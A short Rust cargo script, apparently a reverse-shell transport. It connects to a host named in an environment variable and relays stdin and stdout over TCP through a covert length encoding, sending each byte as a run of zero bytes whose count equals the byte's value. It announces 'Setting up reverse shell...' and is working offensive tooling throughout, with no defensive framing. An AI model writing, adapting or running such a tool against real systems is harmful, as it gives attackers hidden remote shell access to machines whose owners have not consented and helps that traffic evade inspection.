#!/usr/bin/env -S cargo +nightly -Zscript
---cargo
[package]
edition = "2024"
[dependencies]
tokio = { version = "1.43.0", features = ["io-std", "io-util", "macros", "net", "rt", "rt-multi-thread", "time"] }
---

use core::marker::Unpin;
use core::time::Duration;
use std::io::Result;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

async fn wide_to_byte(
    mut rx: impl AsyncReadExt + Unpin,
    mut tx: impl AsyncWriteExt + Unpin,
) -> Result<()> {
    let mut buf = [0u8; 256];
    loop {
        let byte = rx.read(&mut buf).await?;
        assert_ne!(byte, 0);
        tx.write_u8(byte as u8).await?;
        tx.flush().await?;
    }
}

async fn byte_to_wide(
    mut rx: impl AsyncReadExt + Unpin,
    mut tx: impl AsyncWriteExt + Unpin,
) -> Result<()> {
    loop {
        let byte = rx.read_u8().await? as usize;
        assert_eq!(byte, tx.write(&vec![0; byte]).await?);
        tx.flush().await?;
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    let addr = std::env::var("ADDRESS").expect("no addr?");
    let mut wides = TcpStream::connect(addr).await?;
    wides.set_nodelay(true)?;
    let (wides_rx, wides_tx) = wides.split();
    let bytes_rx = tokio::io::stdin();
    let bytes_tx = tokio::io::stdout();

    eprintln!("Setting up reverse shell...");

    let (ttu, utt) = tokio::join!(wide_to_byte(wides_rx, bytes_tx), byte_to_wide(bytes_rx, wides_tx));
    ttu.expect("wide -> byte");
    utt.expect("byte -> wide");
    Ok(())
}
